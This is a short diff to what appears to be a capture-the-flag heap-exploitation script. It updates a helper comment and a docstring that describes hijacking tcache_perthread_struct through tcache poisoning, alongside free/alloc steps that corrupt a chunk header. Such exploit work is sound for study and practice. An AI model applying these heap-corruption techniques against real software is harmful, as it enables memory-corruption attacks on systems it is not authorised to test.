@@ -41,7 +41,7 @@ io = Tube(
     port      = port, 
     env       = {}
 ).init().alias() 
-set_global_io(io)   # s, sa, sl, sla, r, ru, uu64
+set_global_io(io)   # s, sa, sl, sla, r, ru, uu64, g, gp
 init_pr("debug", "%(asctime)s - %(levelname)s - %(message)s", "%H:%M:%S")
 
 # HEAP 
@@ -159,7 +159,7 @@ def xpl(**kwargs):
     Construct tcache linking:
     0x200 [  2 ]: 0x5555555597b0 —▸ 0x5555555592b0 ◂— 0
 
-    then we hijack tcache_perthread_struct by heap overflow (chunk overlapping)
+    then we hijack tcache_perthread_struct by tcahce poisoning 
     """
     free(9)     # 0x700 usbin
     alloc(8, 0x1f8, b"a"*8) # chunk1 hdr corrupted, cannot be put into tcache without padding
